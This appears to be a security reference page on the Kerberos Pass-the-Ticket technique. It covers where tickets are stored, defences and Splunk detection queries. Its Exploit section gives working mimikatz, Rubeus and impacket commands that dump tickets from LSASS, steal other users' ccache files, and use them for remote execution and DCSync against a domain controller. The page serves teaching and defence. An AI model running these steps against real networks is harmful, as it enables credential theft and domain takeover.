# Pass-the-Ticket

Stealing and reusing cached Kerberos tickets.

Pass-the-Ticket (PtT) is a lateral movement technique where the attacker extracts Kerberos
tickets from one machine and injects them into another session. Unlike
[Pass-the-Key](pass-the-key.md), the attacker does not need the user's password or encryption
key -- just the ticket blob itself. A stolen TGT grants access to any service in the domain;
a stolen service ticket is limited to the specific service it was issued for.

---

## How It Works

Kerberos tickets are bearer tokens: anyone who possesses the ticket and its associated session
key can use it. The KDC and target services have no mechanism to verify that the presenter of
a ticket is the same principal it was originally issued to.

### Where Tickets Live

| Platform | Storage Location | Format |
|----------|-----------------|--------|
| Windows | LSASS process memory | In-memory structures; exportable as `.kirbi` files |
| Linux/macOS | File on disk (`/tmp/krb5cc_<uid>` or path in `KRB5CCNAME`) | ccache format |
| Linux (SSSD) | Kernel keyring or KCM | Keyring entries (requires root or `keyctl`) |

On Windows, every interactive logon caches the user's TGT in LSASS. Service tickets are cached
as they are requested. A local administrator (or `SYSTEM`) on the machine can extract all cached
tickets from LSASS memory.

On Linux, ccache files are typically world-readable only to the owning user, but root can read
any ccache. In environments using SSSD with the kernel keyring, extraction requires root access
and keyring manipulation.

### TGTs vs. Service Tickets

**TGTs are far more valuable.** A TGT can be used to request service tickets for any service
in the domain through the [TGS Exchange](../../protocol/tgs-exchange.md). A stolen TGT gives
the attacker the same access as the original user until the ticket expires.

**Service tickets are limited** to the specific service they target (e.g., `CIFS/fileserver`).
Although the `sname` field is encrypted inside the `EncTicketPart`, it is not covered by the
PAC checksum. An attacker who possesses the target account's long-term key can decrypt the
ticket, modify the service class (e.g., change `HTTP/host` to `CIFS/host`), and re-encrypt it.
This is practical when both services run under the same account -- see
[SPN-jacking](../delegation/spn-jacking.md) for details on SPN substitution.

### Ticket Lifetime and Revocation

Per [RFC 4120 &sect;5.3], tickets have an `endtime` field set by the KDC. The default TGT
lifetime in Active Directory is **10 hours**, with a maximum renewal period of **7 days**.

!!! warning "Kerberos tickets cannot be revoked"
    There is no mechanism in the Kerberos protocol to invalidate an individual ticket before its
    expiration time. The only way to invalidate all outstanding TGTs in a domain is to rotate
    the `krbtgt` password twice (see [Golden Ticket -- Defend](../forgery/golden-ticket.md#krbtgt-password-rotation)).
    For service tickets, rotating the user service account's password invalidates outstanding tickets
    for that service.

### Pass-the-Cache

On Linux and macOS, the equivalent technique is sometimes called **Pass-the-Cache** because the
attacker steals the ccache file rather than extracting from process memory. The mechanics are
identical -- only the extraction method differs.

### Ticket Format Conversion

Tools like impacket's `ticketConverter.py` convert between Windows `.kirbi` format and Linux
`.ccache` format:

```bash title="Convert between Windows kirbi and Linux ccache ticket formats"
# Windows kirbi to Linux ccache
ticketConverter.py ticket.kirbi ticket.ccache

# Linux ccache to Windows kirbi
ticketConverter.py ticket.ccache ticket.kirbi
```

---

## Defend

### Credential Guard

Windows Credential Guard isolates LSASS secrets in a virtualization-based security (VBS)
container. When Credential Guard is enabled, Kerberos tickets are stored in the isolated LSA
process (`LsaIso.exe`), which is inaccessible to local administrators and kernel-level
attackers that lack VBS bypass capabilities.

### Protected Users Group

Members of the **Protected Users** security group receive hardened TGT properties:

- TGT lifetime is reduced to **4 hours** (non-renewable)
- TGTs are not cached after initial logon on the DC
- NTLM authentication is disabled (reducing credential exposure)

A 4-hour non-renewable TGT limits the window during which a stolen ticket is usable.

### Short TGT Lifetimes

Reduce the default TGT lifetime from 10 hours to a shorter period via Group Policy:

```
Computer Configuration > Policies > Windows Settings > Security Settings >
  Account Policies > Kerberos Policy > Maximum lifetime for user ticket
```

Shorter lifetimes reduce the value of stolen tickets but may increase KDC load as clients
request new TGTs more frequently.

### Restrict Local Admin Access

Ticket extraction requires local administrator or SYSTEM privileges on the target machine.
Implementing least-privilege local admin policies (removing users from the local Administrators
group, using LAPS for local admin passwords) reduces the attack surface.

### Monitor for Credential Extraction Tools

Deploy endpoint detection for known extraction techniques (mimikatz, Rubeus, direct LSASS
memory reads). Sysmon Event 10 (process access) on `lsass.exe` with `PROCESS_VM_READ` from
unexpected processes is a strong signal.

---

## Detect

### Event Correlation: Ticket Reuse from Multiple Sources

A single Kerberos ticket used from multiple IP addresses is a strong indicator of pass-the-ticket.
In a normal flow, a TGT is requested and used from the same client IP.

Look for Event ID 4769 (service ticket request) where the same user's TGT is used from different
`IpAddress` values within the TGT's lifetime:

```text
index=security EventCode=4769
| stats dc(IpAddress) as source_ips, values(IpAddress) as ip_list by TargetUserName
| where source_ips > 1
```

### Event ID 4768 -- TGT from Unexpected Source

A TGT request (Event 4768) followed by TGS requests (Event 4769) from a **different IP address**
indicates the TGT was moved to another machine:

```text
index=security (EventCode=4768 OR EventCode=4769)
| stats values(IpAddress) as ips, dc(IpAddress) as ip_count by TargetUserName
| where ip_count > 1
```

### Sysmon: LSASS Access (Event 10)

Monitor for processes accessing LSASS memory, which is the extraction step:

```text
index=sysmon EventCode=10 TargetImage="*lsass.exe" GrantedAccess=0x1010
| stats count by SourceImage, Computer
```

### Behavioral Anomalies

- A user accessing resources from a machine they have never used before
- Network logon events (type 3) from unexpected source IPs
- Sudden access to high-value resources (domain controllers, sensitive file shares) from
  workstations that have no business need

---

## Exploit

### 1. Extract Tickets

**From Windows (LSASS memory):**

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

This exports all cached Kerberos tickets (TGTs and service tickets) from every logon session
on the machine as `.kirbi` files.

Rubeus provides more targeted extraction:

```powershell
# Dump all tickets from all sessions (requires elevation)
Rubeus.exe dump /nowrap

# Dump only TGTs
Rubeus.exe dump /service:krbtgt /nowrap

# Triage: list all cached tickets with metadata
Rubeus.exe triage
```

**From Linux (ccache files):**

```bash title="Locate and copy a user's ccache file on Linux"
# Default ccache location
ls -la /tmp/krb5cc_*

# Copy the target user's ccache
cp /tmp/krb5cc_1000 /tmp/stolen.ccache
```

### 2. Inject Tickets

**On Windows:**

```
mimikatz # kerberos::ptt ticket.kirbi
```

Or with Rubeus:

```powershell
Rubeus.exe ptt /ticket:<base64_or_file>
```

Verify injection:

```
klist
```

**On Linux:**

```bash title="Inject stolen ccache and access a file share"
# Point to the stolen ccache
export KRB5CCNAME=/tmp/stolen.ccache

# Use with any Kerberos-aware tool
smbclient //fileserver.corp.local/share -k --no-pass
```

### 3. Use the Stolen Identity

Once the ticket is injected, any Kerberos-authenticated tool will use it transparently:

```bash title="Use injected ticket to access file shares, remote execute, or DCSync"
# Access file shares
dir \\dc01.corp.local\c$

# Remote execution (impacket)
psexec.py -k -no-pass CORP.LOCAL/administrator@dc01.corp.local

# DCSync (if the stolen ticket belongs to a Domain Admin)
secretsdump.py -k -no-pass CORP.LOCAL/administrator@dc01.corp.local
```

---

## Tools

### kerbwolf

`kw-tgt` can generate fresh TGTs using passwords, NT hashes, or AES keys, producing ccache
files that can be used for pass-the-ticket on Linux. CredWolf can validate existing tickets
via `credwolf kerberos --ticket`:

```bash
# Generate a TGT (outputs ccache)
kw-tgt -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p 'Password1!'

# Validate an existing ticket
credwolf -d CORP.LOCAL kerberos --kdc-ip 10.0.0.1 -u admin --ticket admin.ccache
```

### Other Tools

| Tool | Platform | Command | Notes |
|------|----------|---------|-------|
| mimikatz | Windows | `sekurlsa::tickets /export` + `kerberos::ptt` | Extract and inject tickets from/into LSASS |
| Rubeus | Windows | `dump`, `triage`, `ptt` | .NET, runs in-memory, supports base64 ticket input |
| impacket `ticketConverter.py` | Linux | `ticketConverter.py in.kirbi out.ccache` | Convert between kirbi and ccache formats |
| impacket `getTGT.py` | Linux | `getTGT.py CORP/user -hashes :hash` | Request TGT and save as ccache (pass-the-key, then pass-the-ticket) |
